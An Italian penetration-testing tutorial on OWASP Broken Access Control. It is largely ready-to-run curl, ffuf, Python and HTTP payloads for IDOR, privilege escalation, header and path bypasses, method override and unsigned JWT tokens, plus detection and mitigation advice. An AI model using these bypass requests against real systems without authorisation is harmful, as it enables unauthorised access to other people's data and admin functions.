---
title: 'Broken Access Control: Test, Esempi e Bypass OWASP A01'
slug: broken-access-control
description: 'Guida pratica al Broken Access Control OWASP A01:2025: privilege escalation, IDOR e BOLA, force browsing, metodi HTTP, header bypass e test con Burp Suite.'
image: /broken-access-control-owasp-a01.webp
draft: true
date: 2026-08-02T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - broken-access-control
  - access-control
  - idor
---

# Broken Access Control: cos’è e come testare i controlli di accesso

Il Broken Access Control si verifica quando un’applicazione non controlla correttamente ciò che un utente può leggere, modificare o eseguire. Per trovarlo non basta cercare `/admin`: devi ripetere ogni richiesta senza sessione, con un ruolo inferiore e con un secondo utente, modificando oggetti, metodi HTTP, parametri, header e passaggi del workflow.

Il **Broken Access Control** è una vulnerabilità che permette a un utente di accedere a dati o funzioni per cui non possiede i permessi necessari.

In parole semplici: l’applicazione riconosce l’utente, ma non controlla correttamente **cosa può fare** e **su quali risorse può farlo**.

Un account normale potrebbe quindi:

* visualizzare dati appartenenti a un altro utente;
* modificare o eliminare risorse altrui;
* raggiungere funzioni amministrative;
* cambiare il proprio ruolo;
* accedere a file o report riservati;
* saltare un passaggio obbligatorio;
* operare su un tenant o un’organizzazione differente.

Broken Access Control mantiene la prima posizione nell’**OWASP Top 10:2025**. La categoria comprende 40 CWE e include errori di autorizzazione, IDOR, manipolazione dei token, force browsing e altri problemi che consentono azioni oltre i privilegi previsti.

Questa guida è stata verificata a luglio 2026 confrontando:

* OWASP Top 10:2025;
* OWASP Web Security Testing Guide;
* OWASP API Security Top 10:2023;
* PortSwigger Web Security Academy;
* HackTricks;
* PayloadsAllTheThings;
* Hackviser;
* documentazione Burp Suite.

Riferimenti principali:

* [OWASP A01:2025 — Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)
* [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
* [OWASP WSTG — Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README)
* [PortSwigger — Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)

***

## Cos’è il Broken Access Control?

Il Broken Access Control è un errore nella logica di autorizzazione.

L’applicazione dovrebbe verificare, per ogni richiesta:

```text
Chi è l’utente?
Quale ruolo possiede?
Può utilizzare questa funzione?
Può operare su questo specifico oggetto?
L’oggetto appartiene al tenant corretto?
L’azione è permessa nello stato attuale?
```

Quando uno o più di questi controlli mancano, un utente può superare i limiti previsti dal sistema.

Esempio:

```text
Alice può leggere il proprio ordine 1001.
Bob possiede l’ordine 1002.

Alice modifica:

/api/orders/1001
        ↓
/api/orders/1002

Il server restituisce l’ordine di Bob.
```

L’utente era autenticato correttamente. Il problema è che il server non ha verificato se Alice fosse autorizzata ad accedere all’ordine `1002`.

***

## Autenticazione e autorizzazione: qual è la differenza?

**Autenticazione** significa verificare chi sei.

**Autorizzazione** significa verificare cosa puoi fare.

```text
Login corretto
    ↓
Identità verificata
    ↓
Controllo del ruolo
    ↓
Controllo sulla funzione
    ↓
Controllo sul singolo oggetto
```

Un’applicazione può avere:

* password robuste;
* MFA;
* sessioni sicure;
* cookie `HttpOnly`;
* token JWT firmati;

ed essere comunque vulnerabile a Broken Access Control.

Il login non garantisce che tutti i controlli successivi siano corretti.

***

## Tipi di Broken Access Control

| Tipo                             | Cosa permette                                         |
| -------------------------------- | ----------------------------------------------------- |
| Accesso non autenticato          | Raggiungere una risorsa senza login                   |
| Privilege escalation verticale   | Usare funzioni di un ruolo superiore                  |
| Privilege escalation orizzontale | Accedere alle risorse di un altro utente              |
| IDOR / BOLA                      | Manipolare l’identificatore di un oggetto             |
| BFLA                             | Utilizzare una funzione o un endpoint non autorizzato |
| Force browsing                   | Raggiungere direttamente URL nascosti                 |
| HTTP verb tampering              | Bypassare il controllo cambiando metodo HTTP          |
| Parameter tampering              | Modificare ruolo, utente, tenant o permessi           |
| Mass assignment                  | Inviare proprietà non previste dal frontend           |
| Workflow bypass                  | Saltare controlli o passaggi intermedi                |
| Token manipulation               | Alterare claim o metadati usati per i privilegi       |
| Path/header bypass               | Sfruttare differenze tra proxy e backend              |

***

## IDOR, BOLA e BFLA: qual è la differenza?

### IDOR

Un identificatore controllabile permette di accedere direttamente a un oggetto non autorizzato.

```http
GET /api/orders/1002 HTTP/1.1
Cookie: session=TOKEN_ALICE
```

### BOLA

**Broken Object Level Authorization** è il termine usato soprattutto nelle API.

L’utente può usare legittimamente l’endpoint, ma non dovrebbe poter operare su quello specifico oggetto.

```http
DELETE /api/documents/5502 HTTP/1.1
Authorization: Bearer TOKEN_ALICE
```

Il documento `5502` appartiene a Bob.

### BFLA

**Broken Function Level Authorization** riguarda la funzione, non il singolo oggetto.

```http
POST /api/admin/users/42/disable HTTP/1.1
Authorization: Bearer TOKEN_UTENTE
```

L’utente non dovrebbe poter richiamare la funzione amministrativa.

In sintesi:

```text
IDOR / BOLA → posso operare sull’oggetto sbagliato
BFLA        → posso usare una funzione non autorizzata
BAC         → categoria generale che comprende entrambi
```

Per una metodologia dedicata agli identificatori consulta [IDOR](https://hackita.it/articoli/idor/).

***

## Preparare il test

Il metodo più affidabile consiste nell’utilizzare più account controllati.

```text
Account A → utente normale
Account B → altro utente normale
Manager   → ruolo intermedio
Admin     → ruolo privilegiato
Anonimo   → nessuna sessione
```

Costruisci una matrice dei permessi attesi:

|            Funzione | Anonimo | Utente A | Utente B | Manager | Admin |
| ------------------: | ------: | -------: | -------: | ------: | ----- |
|        Profilo di A |      No |       Sì |       No | Dipende | Sì    |
|         Ordine di B |      No |       No |       Sì | Dipende | Sì    |
|      Export globale |      No |       No |       No |      Sì | Sì    |
| Eliminazione utente |      No |       No |       No |      No | Sì    |

Questa matrice diventa l’oracolo del test: ogni comportamento differente deve essere verificato.

***

## Workflow completo per testare Broken Access Control

```text
1. Mappa ruoli, endpoint, oggetti e azioni.
2. Registra una richiesta valida per ogni funzione.
3. Ripetila senza cookie o token.
4. Ripetila con un ruolo inferiore.
5. Ripetila con un secondo utente dello stesso livello.
6. Cambia identificatore dell’oggetto.
7. Cambia metodo HTTP.
8. Modifica parametri, proprietà, cookie e header.
9. Prova URL alternativi e versioni API precedenti.
10. Verifica l’effetto reale lato server.
11. Ripristina ogni modifica effettuata.
```

Non basarti soltanto sullo status code.

Una risposta `200 OK` può contenere un errore applicativo, mentre una risposta `302 Found` potrebbe aver eseguito l’azione prima del redirect.

Controlla sempre:

* corpo della risposta;
* dati restituiti;
* stato finale dell’oggetto;
* azioni registrate;
* richieste successive;
* differenze semantiche;
* eventuali effetti collaterali.

***

## Test 1 — Accesso senza autenticazione

Rimuovi dalla richiesta:

```http
Cookie: session=...
Authorization: Bearer ...
X-API-Key: ...
```

Esempio:

```bash
curl -sk -i \
  https://target.com/api/admin/users
```

Con sessione valida:

```bash
curl -sk -i \
  -H "Cookie: session=TOKEN_UTENTE" \
  https://target.com/api/admin/users
```

Confronta:

* status code;
* header `Location`;
* contenuto;
* dimensione;
* dati sensibili;
* azione eseguita.

Un `200` che contiene la pagina di login non conferma un bypass.

***

## Test 2 — Force browsing

L’interfaccia può nascondere una funzione senza proteggerla realmente.

Prima controlla:

```text
/robots.txt
/sitemap.xml
file JavaScript
documentazione OpenAPI
Swagger UI
messaggi di errore
cronologia Burp
link restituiti dalle API
```

### Fuzzing con ffuf

```bash
ffuf -u https://target.com/FUZZ \
  -H "Cookie: session=TOKEN_UTENTE_NORMALE" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -ac \
  -mc all \
  -fc 404
```

Wordlist più estesa:

```bash
ffuf -u https://target.com/FUZZ \
  -H "Cookie: session=TOKEN" \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -ac \
  -mc all \
  -fc 404
```

Endpoint interessanti:

```text
/admin
/admin/users
/admin/dashboard
/management
/panel
/internal
/debug
/actuator
/actuator/env
/actuator/beans
/.well-known/
/api/v1/admin
/api/internal
/export
/reports
```

La semplice presenza di questi endpoint non è una vulnerabilità.

Il problema esiste quando un’identità non autorizzata riesce a visualizzare dati o utilizzare funzioni riservate.

Non filtrare automaticamente `401`, `403` e `302`: possono aiutare a identificare endpoint reali e comportamenti differenti.

***

## Test 3 — Privilege escalation verticale

Un utente normale prova a richiamare direttamente una funzione amministrativa.

```text
/admin/deleteUser?id=42
/admin/resetPassword?id=42
/admin/export-data
/admin/create-voucher
```

Esempio:

```http
POST /api/admin/users/42/disable HTTP/1.1
Host: target.com
Cookie: session=TOKEN_UTENTE
```

Verifica anche:

* funzioni presenti soltanto nel JavaScript;
* route nascoste dal frontend;
* richieste eseguite dal pannello amministrativo;
* API mobile differenti dal sito;
* endpoint interni chiamati dal backend;
* versioni precedenti dell’API.

Esempi:

```text
/api/v1/admin/users
/api/v2/admin/users
/api/v3/admin/users
```

Una versione recente potrebbe applicare il controllo mentre una precedente potrebbe essere ancora esposta.

***

## Test 4 — Privilege escalation orizzontale

Usa due account di test.

L’account B crea una risorsa:

```text
order_id = 1002
```

L’account A prova a leggerla:

```http
GET /api/orders/1002 HTTP/1.1
Cookie: session=TOKEN_ACCOUNT_A
```

Ripeti il test sulle operazioni:

```text
GET     → lettura
POST    → azione sull’oggetto
PUT     → sostituzione
PATCH   → modifica parziale
DELETE  → eliminazione
```

Gli identificatori possono trovarsi in:

* path;
* query string;
* form;
* JSON;
* XML;
* header;
* cookie;
* nome del file;
* GraphQL variables;
* URL firmati;
* campi annidati.

Non usare dati appartenenti a utenti reali estranei al test.

***

## Payload IDOR e BOLA utili

### Identificatori numerici

```text
/api/users/1001
/api/users/1002
/api/users/1003
```

Prova anche:

```text
0
1
-1
999999
```

### Username ed e-mail

```text
/profile?user=john
/profile?user=john.doe
/profile?email=john.doe@example.com
```

### Valori codificati

```text
/profile?id=am9obi5kb2VAZXhhbXBsZS5jb20=
```

La codifica Base64 non rende l’identificatore segreto.

### Wildcard

Alcuni backend interpretano caratteri speciali come pattern:

```http
GET /api/users/* HTTP/1.1
GET /api/users/% HTTP/1.1
GET /api/users/_ HTTP/1.1
GET /api/users/. HTTP/1.1
```

Sono payload dipendenti dal router e dal backend: non funzionano in modo universale.

### Array

Richiesta originale:

```json
{
  "id": 19
}
```

Varianti:

```json
{
  "id": [19]
}
```

```json
{
  "id": [19, 20]
}
```

### HTTP Parameter Pollution

```text
/api/profile?user_id=ACCOUNT_A&user_id=ACCOUNT_B
```

Oppure:

```text
/api/profile?user_id=ACCOUNT_B&user_id=ACCOUNT_A
```

Proxy, framework e backend possono scegliere il primo valore, l’ultimo o entrambi.

### Cambio del content type

Da JSON:

```http
Content-Type: application/json

{"user_id": 1002}
```

A form:

```http
Content-Type: application/x-www-form-urlencoded

user_id=1002
```

Oppure XML, quando supportato:

```xml
<request>
  <user_id>1002</user_id>
</request>
```

Il controllo potrebbe essere applicato soltanto a uno dei parser.

***

## Test 5 — Parameter tampering

Richiesta legittima:

```http
POST /api/update-profile HTTP/1.1
Content-Type: application/json

{
  "name": "John",
  "email": "john@test.com"
}
```

Aggiungi proprietà non mostrate dall’interfaccia:

```json
{
  "name": "John",
  "email": "john@test.com",
  "role": "admin"
}
```

```json
{
  "name": "John",
  "email": "john@test.com",
  "isAdmin": true
}
```

```json
{
  "name": "John",
  "email": "john@test.com",
  "admin": 1
}
```

```json
{
  "name": "John",
  "email": "john@test.com",
  "user_type": "superuser"
}
```

Altri campi utili, quando coerenti con l’applicazione:

```json
{
  "permissions": ["users:write"],
  "tenantId": "OTHER_TENANT",
  "accountType": "staff"
}
```

La vulnerabilità è confermata soltanto se il backend:

1. accetta il campo;
2. salva la modifica;
3. applica realmente il nuovo privilegio;
4. consente la modifica a un utente non autorizzato.

Questo scenario può combinare Broken Access Control e **mass assignment**.

***

## Cookie, hidden field e header controllabili

### Cookie

```http
Cookie: role=user; session=abc123
```

Modifica:

```http
Cookie: role=admin; session=abc123
```

### Hidden field

```html
<input type="hidden" name="role" value="user">
```

Intercetta la richiesta e prova:

```text
role=admin
```

### Header custom

```http
X-User-ID: 1002
X-User-Role: admin
X-Tenant-ID: tenant-b
```

Questi valori possono essere legittimamente aggiunti da un reverse proxy.

La vulnerabilità esiste quando il backend accetta direttamente il valore fornito dal client senza verificarne provenienza e autorizzazione.

***

## Test 6 — HTTP verb tampering

Un endpoint potrebbe proteggere soltanto un metodo.

```http
GET /admin/users/42/delete HTTP/1.1
```

Risposta:

```text
403 Forbidden
```

Prova l’handler reale:

```http
DELETE /admin/users/42 HTTP/1.1
```

Oppure:

```http
PATCH /api/users/42 HTTP/1.1
Content-Type: application/json

{"admin": true}
```

`HEAD` può essere utile per capire se un endpoint esiste senza richiedere il corpo:

```http
HEAD /admin/dashboard HTTP/1.1
```

Verifica i metodi dichiarati:

```bash
curl -sk -i \
  -X OPTIONS \
  -H "Cookie: session=TOKEN_UTENTE" \
  https://target.com/api/admin/users
```

### Script di confronto

Usalo soltanto su una risorsa di test non distruttiva:

```python
import requests

url = "https://target.com/api/test-resource"
headers = {"Cookie": "session=TOKEN_NORMALE"}
verbs = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

for verb in verbs:
    try:
        response = requests.request(
            verb,
            url,
            headers=headers,
            timeout=10,
            allow_redirects=False,
        )

        print(
            f"{verb:7} "
            f"{response.status_code} "
            f"{len(response.content)} bytes "
            f"Location={response.headers.get('Location', '-')}"
        )
    except requests.RequestException as error:
        print(f"{verb:7} ERROR: {error}")
```

Non inviare automaticamente `PUT`, `PATCH` o `DELETE` contro dati reali.

***

## Method override

Alcuni framework permettono di sovrascrivere il metodo:

```http
POST /api/users/42 HTTP/1.1
X-HTTP-Method-Override: DELETE
```

Varianti:

```http
X-HTTP-Method: DELETE
X-Method-Override: DELETE
```

Oppure:

```text
_method=DELETE
```

Il test è pertinente soltanto quando framework, gateway o applicazione supportano l’override.

***

## Test 7 — X-Original-URL e X-Rewrite-URL

Un reverse proxy può controllare il path originale mentre il backend usa un header per scegliere la route finale.

Richiesta bloccata:

```http
GET /admin HTTP/1.1
Host: target.com
```

Risposta:

```text
403 Forbidden
```

Variante:

```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

Altra variante:

```http
GET / HTTP/1.1
Host: target.com
X-Rewrite-URL: /admin
```

Con `curl`:

```bash
curl -sk -i \
  -H "X-Original-URL: /admin" \
  https://target.com/
```

```bash
curl -sk -i \
  -H "X-Rewrite-URL: /admin" \
  https://target.com/
```

Loop corretto:

```bash
for header in X-Original-URL X-Rewrite-URL; do
  code=$(curl -sk \
    -o /dev/null \
    -w "%{http_code}" \
    -H "$header: /admin" \
    https://target.com/)

  echo "$header: $code"
done
```

Questi header non sono supportati universalmente. Il bypass esiste soltanto se frontend e backend interpretano il path in modo differente.

***

## Test 8 — Header basati sull’indirizzo IP

Quando una funzione è limitata agli indirizzi interni, verifica se l’applicazione si fida di header controllabili.

```http
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

Esempi:

```bash
curl -sk -i \
  -H "X-Custom-IP-Authorization: 127.0.0.1" \
  https://target.com/admin
```

```bash
curl -sk -i \
  -H "X-Forwarded-For: 127.0.0.1" \
  https://target.com/admin
```

```bash
curl -sk -i \
  -H "X-Real-IP: 127.0.0.1" \
  https://target.com/admin
```

La vulnerabilità non è la presenza dell’header.

Il problema nasce quando il backend considera attendibile un valore inviato direttamente da Internet invece di accettarlo soltanto da un reverse proxy autorizzato.

***

## Test 9 — Manipolazione e normalizzazione del path

Proxy, WAF, server e framework possono normalizzare i percorsi in modo differente.

Payload originali:

```text
/ADMIN
/admin/
/admin..;/
/admin%20
/admin%2e
/./admin/./
//admin
```

Ulteriori varianti:

```text
/%61dmin
/admin;
/admin.json
/admin%2f
```

Con `curl`:

```bash
curl -sk -i \
  --path-as-is \
  -H "Cookie: session=TOKEN_UTENTE" \
  "https://target.com/./admin/./"
```

Test multiplo:

```bash
paths=(
  "/admin"
  "/ADMIN"
  "/admin/"
  "//admin"
  "/./admin/./"
  "/admin..;/"
  "/admin%20"
  "/admin%2e"
)

for path in "${paths[@]}"; do
  curl -sk \
    --path-as-is \
    -o /dev/null \
    -w "$path -> %{http_code} %{size_download}\n" \
    -H "Cookie: session=TOKEN_UTENTE" \
    "https://target.com$path"
done
```

`/admin..;/` è particolarmente dipendente da container Java, Tomcat, Spring e relative versioni. Non va presentato come bypass generico.

***

## Test 10 — Versioni API alternative

Un controllo può essere presente nella versione corrente ma assente in una route precedente.

```text
/api/v1/users/42
/api/v2/users/42
/api/v3/users/42
```

Prova anche estensioni o formati differenti:

```text
/api/users/42
/api/users/42.json
/api/users/42.xml
```

Oppure route singolari e plurali:

```text
/api/user/42
/api/users/42
```

La risposta diversa non conferma da sola una vulnerabilità: verifica sempre oggetto ed effetto.

***

## Test 11 — Workflow multi-step

Le applicazioni possono proteggere il primo passaggio e dimenticare quello che produce l’effetto finale.

```text
1. Inserimento dati
2. Revisione
3. Conferma
4. Esecuzione
```

Prova a:

* richiamare direttamente l’ultimo step;
* saltare la conferma;
* cambiare account tra i passaggi;
* riutilizzare una richiesta già completata;
* modificare l’oggetto dopo l’approvazione;
* invertire l’ordine delle richieste.

Esempio:

```http
POST /admin/users/42/promote/confirm HTTP/1.1
Cookie: session=TOKEN_UTENTE
```

Il server deve verificare nuovamente:

* ruolo;
* proprietà dell’oggetto;
* stato corrente;
* passaggi completati;
* tenant;
* eventuale approvazione separata.

***

## Test 12 — JWT manipulation

Un JWT può contenere informazioni usate per le autorizzazioni:

```json
{
  "user_id": 42,
  "role": "user",
  "exp": 1710000000
}
```

### Decodifica veloce del payload

Il comando originale può fallire per padding o Base64URL:

```bash
echo "eyJhbGc..." |
  cut -d'.' -f2 |
  base64 -d 2>/dev/null |
  python3 -m json.tool
```

Versione più robusta:

```bash
export TOKEN='eyJ...'

python3 - <<'PY'
import base64
import json
import os

token = os.environ["TOKEN"]
payload = token.split(".")[1]
payload += "=" * (-len(payload) % 4)

decoded = base64.urlsafe_b64decode(payload)
print(json.dumps(json.loads(decoded), indent=2))
PY
```

### Payload `alg: none`

Header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Payload modificato:

```json
{
  "user_id": 42,
  "role": "admin"
}
```

Firma vuota:

```text
BASE64URL_HEADER.BASE64URL_PAYLOAD.
```

Questo test ha senso soltanto quando la libreria server accetta token non firmati.

La semplice modifica del payload non funziona se la firma viene verificata correttamente.

Per algoritmi, chiavi, claim e bypass specifici consulta [JWT](https://hackita.it/articoli/jwt/).

***

## Test 13 — File, documenti ed export

I controlli di accesso devono proteggere anche le risorse statiche.

```text
/downloads/invoice-1001.pdf
/exports/report-2026.csv
/uploads/users/42/document.pdf
/files/tenant-a/contract.pdf
```

Verifica:

* accesso senza sessione;
* accesso con un altro account;
* modifica dell’identificatore;
* URL ancora valido dopo logout;
* scadenza dei link firmati;
* tenant corretto;
* permesso di download distinto da quello di visualizzazione.

Un nome casuale o un UUID non sostituisce il controllo di autorizzazione.

***

## Test 14 — GraphQL

GraphQL può applicare controlli differenti su query, mutation e campi annidati.

```graphql
query {
  order(id: "1002") {
    id
    total
    customer {
      email
    }
  }
}
```

Verifica separatamente:

* accesso all’ordine;
* accesso al cliente;
* campi riservati;
* mutation;
* oggetti appartenenti a un altro tenant;
* nodi recuperati tramite ID globale.

Esempio mutation:

```graphql
mutation {
  updateUser(
    id: "42",
    input: {
      role: "admin"
    }
  ) {
    id
    role
  }
}
```

Un controllo corretto sul resolver principale non garantisce che tutti i campi annidati siano autorizzati.

***

## Automazione con Burp Autorize

L’estensione **Autorize** ripete le richieste eseguite con un account privilegiato usando il token di un account con privilegi inferiori.

Workflow:

```text
1. Installa Autorize dal BApp Store.
2. Inserisci cookie o header dell’utente normale.
3. Limita il test agli host in scope.
4. Naviga nell’applicazione come amministratore.
5. Autorize ripete le richieste con il token low-priv.
6. Analizza le differenze.
7. Conferma manualmente ogni risultato.
```

Non considerare automaticamente vulnerabile una risposta simile.

Due risposte possono:

* avere la stessa dimensione ma dati differenti;
* restituire lo stesso template;
* contenere messaggi diversi;
* eseguire azioni differenti;
* usare redirect dopo il controllo.

Strumenti complementari:

* AuthMatrix;
* Authz;
* Burp Repeater;
* Burp Comparer;
* Match and Replace.

Consulta anche [Burp Suite](https://hackita.it/articoli/burp-suite/).

***

## Come confermare il risultato

Una vulnerabilità è confermata quando puoi dimostrare:

```text
Identità utilizzata
        ↓
Permesso previsto
        ↓
Richiesta modificata
        ↓
Risorsa o funzione ottenuta
        ↓
Effetto non autorizzato
```

Esempio:

```text
Account: alice
Ruolo: customer
Permesso atteso: può leggere solo i propri ordini
Richiesta: GET /api/orders/1002
Proprietario: bob
Risultato: dati completi restituiti
Impatto: accesso orizzontale ai dati di un altro utente
```

Non confermare il finding basandoti soltanto su:

* status `200`;
* dimensione differente;
* endpoint esistente;
* assenza di errore;
* valore modificato nel frontend;
* risposta non verificata;
* ruolo cambiato ma non persistito.

***

## Falsi positivi comuni

### Pagina di login con status 200

La risposta non contiene la risorsa protetta.

### Redirect dopo il controllo

Un `302` può indicare accesso negato oppure un’azione eseguita prima del redirect.

Verifica lo stato finale.

### Cache

Aggiungi:

```http
Cache-Control: no-cache
Pragma: no-cache
```

e usa identificatori controllati.

### Cookie di più account

Il browser può inviare sessioni sovrapposte. Usa profili separati o Burp Repeater.

### Token CSRF assente

Un `403` causato dal CSRF non dimostra che l’autorizzazione sia corretta.

Mantieni un token CSRF valido e modifica soltanto l’identità.

### Risorsa pubblica

Verifica i requisiti funzionali prima di dichiarare un IDOR.

### Modifica non persistita

Il server potrebbe riflettere il valore nella risposta senza salvarlo.

Rileggi la risorsa con una seconda richiesta.

***

## Detection

Il Broken Access Control non produce un singolo evento standard.

La detection deve analizzare il comportamento applicativo.

Registra almeno:

* identità;
* ruolo;
* tenant;
* endpoint;
* metodo HTTP;
* oggetto richiesto;
* proprietario dell’oggetto;
* azione;
* decisione allow/deny;
* origine;
* sessione correlata.

Indicatori utili:

* accesso sequenziale a molti ID;
* ruolo basso che richiama route amministrative;
* richieste verso tenant differenti;
* variazioni ripetute del metodo HTTP;
* uso di path override;
* accesso a versioni API obsolete;
* modifica di `role`, `permissions` o `tenantId`;
* richieste dirette allo step finale;
* download di numerose risorse appartenenti ad altri utenti;
* wildcard o parameter pollution sugli identificatori.

Non registrare in chiaro:

* password;
* token completi;
* cookie;
* segreti API;
* dati personali non necessari.

***

## Mitigazioni

### Deny by default

Ogni risorsa deve essere negata finché una regola non ne consente esplicitamente l’accesso.

### Controlli server-side

Non affidarti a:

* JavaScript;
* pulsanti nascosti;
* route guard frontend;
* hidden field;
* cookie modificabili;
* claim non verificati;
* parametri controllati dal client.

### Verifica su ogni richiesta

Controlla:

```text
utente
ruolo
funzione
oggetto
azione
tenant
stato del workflow
```

### Controllo della proprietà

Non basta verificare che l’oggetto esista.

```text
L’utente può leggere questo oggetto?
Può modificarlo?
Può eliminarlo?
Appartiene alla sua organizzazione?
L’azione è valida nello stato corrente?
```

### Policy centralizzate

Usa middleware, interceptor o policy riutilizzabili invece di duplicare i controlli in ogni controller.

### Minimo privilegio

Separa i permessi:

```text
read
create
update
delete
approve
export
admin
```

### Protezione delle risorse statiche

File, report, allegati ed export devono passare attraverso lo stesso modello autorizzativo delle API.

### Test automatici

Per ogni endpoint sensibile crea test:

```text
utente autorizzato      → consentito
utente non autorizzato  → negato
altro tenant            → negato
utente anonimo          → negato
oggetto inesistente     → risposta sicura
```

### Rate limiting e monitoring

Il rate limiting non corregge la vulnerabilità, ma limita l’enumerazione automatizzata e migliora la rilevazione.

***

## Come valutare l’impatto

La severità non è automaticamente Critical.

Valuta:

* tipo di dati;
* lettura, modifica o cancellazione;
* ruolo iniziale;
* privilegi ottenuti;
* numero di utenti coinvolti;
* accesso cross-tenant;
* possibilità di automazione;
* impatto economico;
* concatenazione con altre vulnerabilità;
* persistenza dell’azione.

Esempi indicativi:

| Scenario                         | Impatto possibile   |
| -------------------------------- | ------------------- |
| Lettura del profilo pubblico     | Informational / Low |
| Lettura di PII altrui            | Medium / High       |
| Modifica di ordini altrui        | High                |
| Cambio del proprio ruolo         | High / Critical     |
| Funzione amministrativa completa | Critical            |
| Accesso cross-tenant             | High / Critical     |

La severità finale dipende dal contesto reale.

***

## Come scrivere il finding

Usa un titolo specifico:

```text
Horizontal privilege escalation in GET /api/orders/{id}
```

oppure:

```text
Vertical privilege escalation through POST /api/admin/users/{id}/disable
```

Il report dovrebbe includere:

```text
Ruolo iniziale
Permesso atteso
Account utilizzati
Oggetto controllato
Richiesta originale
Richiesta modificata
Risposta rilevante
Effetto verificato
Impatto
Riproduzione
Mitigazione
Cleanup
```

Evita titoli generici come:

```text
Broken Access Control nel sito
```

***

## Domande frequenti

### Broken Access Control e IDOR sono la stessa cosa?

No. Broken Access Control è la categoria generale. IDOR è un caso specifico in cui un riferimento diretto, come un ID nell’URL o nel JSON, permette di accedere a un oggetto non autorizzato. Nelle API questo scenario viene spesso descritto come BOLA, Broken Object Level Authorization.

### Broken Access Control richiede autenticazione?

Non sempre. Alcune vulnerabilità permettono l’accesso senza login; altre richiedono un account con privilegi bassi. Il test deve quindi confrontare almeno tre condizioni: nessuna sessione, utente normale e utente autorizzato.

### Qual è la differenza tra BOLA e BFLA?

BOLA riguarda lo specifico oggetto: l’utente può chiamare l’endpoint ma non dovrebbe operare su quella risorsa. BFLA riguarda la funzione: l’utente non dovrebbe poter richiamare l’endpoint o l’azione, indipendentemente dall’oggetto.

### Un HTTP 200 conferma la vulnerabilità?

No. Il `200 OK` può contenere una pagina di login, un errore o dati filtrati. Bisogna verificare il corpo della risposta e l’effetto reale sul server. Anche `302`, `403` o risposte della stessa dimensione possono richiedere un’analisi manuale.

### Come si previene il Broken Access Control?

I controlli devono essere implementati lato server, applicati a ogni richiesta e basati su ruolo, funzione, oggetto, azione e tenant. È necessario adottare deny by default, minimo privilegio, policy centralizzate e test automatici con utenti e ruoli differenti.

***

## Checklist operativa

```text
[ ] L’endpoint funziona senza autenticazione?
[ ] Un utente normale può chiamare funzioni amministrative?
[ ] Un utente può leggere oggetti di un altro account?
[ ] Può modificarli o eliminarli?
[ ] Il tenant è controllabile dal client?
[ ] Cambiando metodo HTTP cambia l’autorizzazione?
[ ] Sono supportati method override?
[ ] X-Original-URL modifica il routing?
[ ] X-Forwarded-For influenza i privilegi?
[ ] Il frontend nasconde soltanto la funzione?
[ ] Il backend accetta role o isAdmin?
[ ] Sono esposte versioni API precedenti?
[ ] Array o parameter pollution cambiano l’oggetto?
[ ] I workflow finali ricontrollano i permessi?
[ ] I file richiedono autorizzazione?
[ ] JWT e cookie vengono verificati?
[ ] GraphQL protegge campi e resolver?
[ ] È stato verificato l’effetto reale?
[ ] Le modifiche sono state ripristinate?
```

***

## Cheat Sheet

```bash
# Accesso senza autenticazione
curl -sk -i \
  https://TARGET/api/admin/users

# Accesso con sessione utente
curl -sk -i \
  -H "Cookie: session=USER_TOKEN" \
  https://TARGET/api/admin/users

# Force browsing
ffuf -u https://TARGET/FUZZ \
  -H "Cookie: session=USER_TOKEN" \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -ac -mc all -fc 404

# HTTP verb tampering
for verb in GET POST PUT PATCH DELETE; do
  curl -sk \
    -X "$verb" \
    -o /dev/null \
    -w "$verb: %{http_code} %{size_download}\n" \
    -H "Cookie: session=USER_TOKEN" \
    https://TARGET/api/test-resource
done

# URL override
curl -sk -i \
  -H "X-Original-URL: /admin" \
  https://TARGET/

curl -sk -i \
  -H "X-Rewrite-URL: /admin" \
  https://TARGET/

# IP-based bypass
curl -sk -i \
  -H "X-Custom-IP-Authorization: 127.0.0.1" \
  https://TARGET/admin

curl -sk -i \
  -H "X-Forwarded-For: 127.0.0.1" \
  https://TARGET/admin

# Path normalization
curl -sk -i \
  --path-as-is \
  -H "Cookie: session=USER_TOKEN" \
  "https://TARGET/./admin/./"

# BOLA / IDOR
curl -sk -i \
  -H "Cookie: session=TOKEN_ACCOUNT_A" \
  https://TARGET/api/orders/ID_ACCOUNT_B

# Parameter pollution
curl -sk -i \
  -H "Cookie: session=TOKEN_ACCOUNT_A" \
  "https://TARGET/api/profile?user_id=ACCOUNT_A&user_id=ACCOUNT_B"

# Wildcard
curl -sk -i \
  -H "Cookie: session=USER_TOKEN" \
  "https://TARGET/api/users/*"

# Method override
curl -sk -i \
  -X POST \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Cookie: session=USER_TOKEN" \
  https://TARGET/api/test-resource
```

***

## Articoli Hackita correlati

* [IDOR — Insecure Direct Object Reference](https://hackita.it/articoli/idor/)
* [Auth e Access Control: guida completa](https://hackita.it/articoli/auth-access-control-guida-completa/)
* [Privilege Escalation Web](https://hackita.it/articoli/privilege-escalation-web/)
* [JWT: exploitation e bypass](https://hackita.it/articoli/jwt/)
* [CORS Misconfiguration](https://hackita.it/articoli/cors-misconfiguration/)
* [ffuf](https://hackita.it/articoli/ffuf/)
* [Burp Suite](https://hackita.it/articoli/burp-suite/)
* [Attacchi alle applicazioni web](https://hackita.it/articoli/attacchi-applicazioni-web/)

***

## Fonti tecniche

### Fonti primarie

* [OWASP Top 10:2025 — A01 Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)
* [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
* [OWASP WSTG — Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README)
